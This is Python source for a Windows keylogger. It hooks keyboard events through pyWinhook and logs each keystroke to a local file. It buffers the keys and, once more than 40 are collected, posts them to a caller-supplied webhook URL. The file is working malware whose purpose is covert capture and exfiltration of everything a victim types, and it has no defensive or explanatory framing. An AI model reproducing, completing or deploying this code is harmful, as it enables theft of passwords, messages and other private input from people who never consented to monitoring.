import pyWinhook
import pythoncom
import logging
import threading
import requests

log = []
webhook_url = ""  # Global variable to store the webhook URL

def OnKeyboardEvent(event):
    global log
    logging.basicConfig(filename='keylogger.txt', level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    # Check special keys
    if event.Ascii == 5:
        log.append('`[Ctrl+Break]`')
    elif event.Ascii == 9:
        log.append('`[Tab]`')
    elif event.Ascii == 13:
        log.append('`[Enter]`')
    elif event.Ascii == 27:
        log.append('`[Esc]`')
    elif event.Ascii == 32:
        log.append(' ')
    elif event.Ascii == 127:
        log.append('`[Del]`')
    elif event.Ascii == 8:
        log.append('`[Backspace]`')
    elif event.Ascii == 0:
        log.append('`[NUL]`')
    elif event.Ascii == 11:
        log.append('`[VT]`')
    elif event.Ascii == 12:
        log.append('`[NP]`')
    elif event.Ascii == 14:
        log.append('`[SO]`')
    elif event.Ascii == 15:
        log.append('`[SI]`')
    elif event.Ascii == 16:
        log.append('`[DLE]`')
    elif event.Ascii == 17:
        log.append('`[DC1]`')
    elif event.Ascii == 18:
        log.append('`[DC2]`')
    elif event.Ascii == 19:
        log.append('`[DC3]`')
    elif event.Ascii == 20:
        log.append('`[DC4]`')
    elif event.Ascii == 21:
        log.append('`[NAK]`')
    elif event.Ascii == 22:
        log.append('`[SYN]`')
    elif event.Ascii == 23:
        log.append('`[ETB]`')
    elif event.Ascii == 24:
        log.append('`[CAN]`')
    elif event.Ascii == 25:
        log.append('`[EM]`')
    elif event.Ascii == 26:
        log.append('`[SUB]`')
    elif event.Ascii == 27:
        log.append('`[ESC]`')
    elif event.Ascii == 28:
        log.append('`[FS]`')
    elif event.Ascii == 29:
        log.append('`[GS]`')
    elif event.Ascii == 30:
        log.append('`[RS]`')
    elif event.Ascii == 31:
        log.append('`[US]`')
    elif event.Ascii == 162:
        log.append('`[Ctrl+Up]`')
    elif event.Ascii == 163:
        log.append('`[Ctrl+Down]`')
    elif event.Ascii == 164:
        log.append('`[Ctrl+Left]`')
    elif event.Ascii == 165:
        log.append('`[Ctrl+Right]`')
    elif event.Ascii == 166:
        log.append('`[Alt+Up]`')
    elif event.Ascii == 167:
        log.append('`[Alt+Down]`')
    else:
        key = chr(event.Ascii)
        log.append(key)
    send_logs()
    return True

def send_logs():
    global log
    if len(log) > 40:
        log_content = "".join(log)
        requests.post(webhook_url, json={"content": log_content})
        log = []
    

def start_keylogger(url):
    global webhook_url
    webhook_url = url

    # Sets a hook on Windows Events
    hooks_manager = pyWinhook.HookManager()
    # Sets the hook on keyboard events and captures the key presses
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()

    # Sends the logs to the webhook
    threading.Timer(12, send_logs).start()

    # pythoncom module captures the messages
    pythoncom.PumpMessages()
